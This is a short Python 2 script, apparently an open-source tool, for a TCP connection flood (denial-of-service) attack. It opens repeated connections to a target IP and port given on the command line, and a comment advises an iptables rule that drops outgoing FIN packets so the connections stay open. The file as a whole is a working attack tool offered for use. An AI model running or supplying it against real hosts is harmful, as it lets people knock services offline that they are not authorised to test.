#!/usr/bin/env python

"""This script will run a connection flood attack against a specified target just provide it with the number of requests and it will flood the target"""

#On Linux run update your IP Tables before running this attack: #iptables -A OUTPUT -p tcp -s <Attack IP> --tcp-flags FIN FIN -j DROP

from scapy.all import *
from subprocess import call
import sys

# default target ip
targetIP = '127.0.0.1'
# default Target Port 
targetPort = 22
# number of requests
numberOfRequests = 10

def ConnectionFlood(targetIP,number):
	print "Start Connect Flooding Attack"
	try:
		i=number
		while(i>0):
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((targetIP,targetPort))
			print "Connection Request Sent"
			i=i-1

		print "Connection Flooding Finished"
	except KeyboardInterrupt: 
		print "[*] Connection Flood Attack Finished."
		

if len(sys.argv) < 3:
	print "Usage: filename.py <targetIP> <portNumber> <number_of_connections>"
else:
	try:
		targetIP = sys.argv[1]
		targetPort = int(sys.argv[2])
		numberOfRequests = int(sys.argv[3])
		ConnectionFlood(targetIP,numberOfRequests)
	except:
		print 'Running with connection flood against 127.0.0.1:22'
		ConnectionFlood(targetIP,numberOfRequests)


__author__ = "Patrick Lismore"
__copyright__ = "Copyright 2019, The Connection Flood Project"
__credits__ = ["Patrick Lismore"]
__license__ = "MIT"
__version__ = "1.0.0"
__maintainer__ = "Patrick Lismore"
__email__ = "patrick@patricklismore.com"
__status__ = "Production"
